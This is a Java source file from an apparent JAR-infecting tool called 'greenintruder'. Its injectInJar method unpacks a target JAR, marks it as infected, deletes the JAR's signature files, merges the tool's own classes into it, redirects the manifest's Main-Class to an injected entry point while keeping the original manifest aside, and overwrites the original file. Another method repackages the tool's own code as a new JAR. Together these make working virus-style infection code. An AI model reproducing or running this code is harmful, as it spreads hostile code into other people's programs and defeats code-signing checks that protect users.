package io.github.explodingbottle.greenintruder.certifier.admintools;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.Random;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import io.github.explodingbottle.greenintruder.certifier.CertifierMain;
import io.github.explodingbottle.greenintruder.certifier.ContentList;
import io.github.explodingbottle.greenintruder.certifier.InjectedMain;

public class InjectionTool {

	private static final int MIN_FOLDER_NUMBER = 1000000;
	private static final int MAX_FOLDER_NUMBER = 9999999;

	private static byte[] privateByteBuffer = new byte[2048];

	private static final void deleteRecursively(File folder) {
		File[] list = folder.listFiles();
		if (list != null) {
			for (File file2 : list) {
				if (file2.isDirectory()) {
					deleteRecursively(file2);
				}
				file2.delete();
			}
		}
		folder.delete();
	}

	private static final File generateTempFolder() {
		Random randomFactory = new Random();
		File temp = new File(System.getenv("TEMP"),
				"jvmtmp_" + (randomFactory.nextInt(MAX_FOLDER_NUMBER + MIN_FOLDER_NUMBER) + MIN_FOLDER_NUMBER));
		if (temp.mkdirs()) {
			return temp;
		}
		return null;
	}

	private static final boolean rejarRecursive(Path filePath2, File mainFold, JarOutputStream jos) {
		try {
			System.out.println(filePath2);
			File[] fileList = filePath2.toFile().listFiles();
			if (fileList != null) {
				for (File realFile : fileList) {
					Path filePath = realFile.toPath();
					if (realFile.isDirectory()) {
						if (!rejarRecursive(filePath, mainFold, jos)) {
							return false;
						}
					}
					if (!realFile.equals(mainFold)) {
						Path relativized = mainFold.toPath().relativize(filePath);
						ZipEntry nextEntry;
						if (realFile.isDirectory()) {
							nextEntry = new ZipEntry(relativized.toString().replace("\\", "/") + "/");
							jos.putNextEntry(nextEntry);
						} else {
							nextEntry = new ZipEntry(relativized.toString().replace("\\", "/"));
							jos.putNextEntry(nextEntry);
							FileInputStream fis = new FileInputStream(realFile);
							int readed = fis.read(privateByteBuffer, 0, privateByteBuffer.length);
							while (readed != -1) {
								jos.write(privateByteBuffer, 0, readed);
								readed = fis.read(privateByteBuffer, 0, privateByteBuffer.length);
							}
							fis.close();
							jos.closeEntry();
						}
					}
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
			return false;
		}

		return true;
	}

	private static final boolean rejar(File folder, File to) throws IOException {
		FileOutputStream fos = new FileOutputStream(to);
		JarOutputStream jos = new JarOutputStream(fos);
		boolean worked = rejarRecursive(folder.toPath(), folder, jos);
		jos.finish();
		jos.close();
		fos.close();
		if (!worked) {
			to.delete();
			return false;
		}
		return true;
	}

	private static final void unzip(FileInputStream fis, File location, String[] inclusionList) throws IOException {
		ZipInputStream jarInput = new ZipInputStream(fis);

		ZipEntry entry = jarInput.getNextEntry();
		while (entry != null) {
			boolean include = false;
			if (inclusionList != null) {
				for (String iElem : inclusionList) {
					if (iElem.startsWith(entry.getName().replace("\\", "/"))) {
						include = true;
						break;
					}
				}
			} else {
				include = true;
			}
			if (include) {
				if (entry.isDirectory()) {
					File newDirectory = new File(location, entry.getName());
					if (!newDirectory.exists() && !newDirectory.mkdirs()) {
						jarInput.close();
						return;
					}
				} else {
					File newFile = new File(location, entry.getName());
					if (!newFile.getParentFile().exists()) {
						if (!newFile.getParentFile().mkdirs()) {
							jarInput.close();
							return;
						}
					}
					FileOutputStream output = new FileOutputStream(newFile);
					int readed = jarInput.read(privateByteBuffer, 0, privateByteBuffer.length);
					while (readed != -1) {
						output.write(privateByteBuffer, 0, readed);
						readed = jarInput.read(privateByteBuffer, 0, privateByteBuffer.length);
					}
					output.close();
				}
			}

			entry = jarInput.getNextEntry();
		}

		jarInput.close();
	}

	public static final boolean extractCodeFromMyself(File destinationPath) {
		File tempFolder = null;
		try {
			tempFolder = generateTempFolder();
			if (tempFolder == null) {
				return false;
			}
			File programSource = new File(
					InjectionTool.class.getProtectionDomain().getCodeSource().getLocation().toURI());
			FileInputStream fisJarSelf = new FileInputStream(programSource);
			Class<?>[] classesList = ContentList.getClassesToExtract();
			String[] additionalData = ContentList.getAdditionalDataToExtract();
			String[] includes = new String[classesList.length + additionalData.length];
			for (int it = 0; it < classesList.length; it++) {
				includes[it] = classesList[it].getName().replace(".", "/") + ".class";
			}
			for (int it = 0; it < additionalData.length; it++) {
				includes[classesList.length + it] = additionalData[it];
			}
			unzip(fisJarSelf, tempFolder, includes);
			fisJarSelf.close();
			File metaFolder = new File(tempFolder, "META-INF");
			if (!metaFolder.exists()) {
				metaFolder.mkdirs();
			}
			File manifest = new File(metaFolder, "MANIFEST.MF");
			FileOutputStream fosManif = new FileOutputStream(manifest);
			Manifest rlManif = new Manifest();
			rlManif.getMainAttributes().putValue("Manifest-Version", "1.0");
			rlManif.getMainAttributes().putValue("Class-Path", ".");
			rlManif.getMainAttributes().putValue("Main-Class", CertifierMain.class.getName());
			rlManif.write(fosManif);
			fosManif.close();
			boolean succeed = rejar(tempFolder, destinationPath);
			if (tempFolder != null) {
				deleteRecursively(tempFolder);
			}
			return succeed;
		} catch (Exception e) {
		}
		if (tempFolder != null) {
			deleteRecursively(tempFolder);
		}
		return false;
	}

	public static final boolean injectInJar(File jarPath) {
		File tempFolder = null;
		try {
			tempFolder = generateTempFolder();
			if (tempFolder == null) {
				return false;
			}
			File programSource = new File(
					InjectionTool.class.getProtectionDomain().getCodeSource().getLocation().toURI());
			FileInputStream jarFIS = new FileInputStream(jarPath);
			unzip(jarFIS, tempFolder, null);
			jarFIS.close();
			File injectionMarker = new File(tempFolder, "jfastboot_mark");
			if (injectionMarker.exists()) {
				return false;
			}
			if (!injectionMarker.createNewFile()) {
				return false;
			}
			File manifestFolder = new File(tempFolder, "META-INF");
			if (manifestFolder.exists()) {
				File manifestSF = new File(manifestFolder, "MANIFEST.SF");
				if (manifestSF.exists()) {
					manifestSF.delete();
				}
				File manifestDSA = new File(manifestFolder, "MANIFEST.DSA");
				if (manifestDSA.exists()) {
					manifestDSA.delete();
				}
				File manifestFile = new File(manifestFolder, "MANIFEST.MF");
				File fastBootFile = null;
				if (manifestFile.exists()) {
					fastBootFile = new File(tempFolder, "JFASTBOOT.MF");
					if (!manifestFile.renameTo(fastBootFile)) {
						return false;
					}
				}
				FileInputStream fbpFis = new FileInputStream(fastBootFile);
				Manifest jfastBootProps = new Manifest(fbpFis);
				Manifest newManifest;
				fbpFis.close();
				FileInputStream fisJarSelf = new FileInputStream(programSource);
				unzip(fisJarSelf, tempFolder, null);
				fisJarSelf.close();
				newManifest = (Manifest) jfastBootProps.clone();
				newManifest.getMainAttributes().putValue("Main-Class", InjectedMain.class.getName());
				FileOutputStream fos = new FileOutputStream(manifestFile);
				newManifest.write(fos);
				fos.close();
			} else {
				FileInputStream fisJarSelf = new FileInputStream(programSource);
				unzip(fisJarSelf, tempFolder, null);
				fisJarSelf.close();
			}
			Random randomFactory = new Random();
			File tempJar = new File(System.getenv("TEMP"), "jartemp"
					+ (randomFactory.nextInt(MAX_FOLDER_NUMBER + MIN_FOLDER_NUMBER) + MIN_FOLDER_NUMBER) + ".sys");
			boolean good = rejar(tempFolder, tempJar);
			if (tempFolder != null) {
				deleteRecursively(tempFolder);
			}
			if (good) {
				boolean goo2 = true;
				try {
					Files.move(tempJar.toPath(), jarPath.toPath(), StandardCopyOption.REPLACE_EXISTING);
				} catch (Exception e) {
					goo2 = false;
				}
				tempJar.delete();
				return goo2;
			}
			return false;

		} catch (Exception e) {
		}
		if (tempFolder != null) {
			deleteRecursively(tempFolder);
		}
		return false;
	}

}
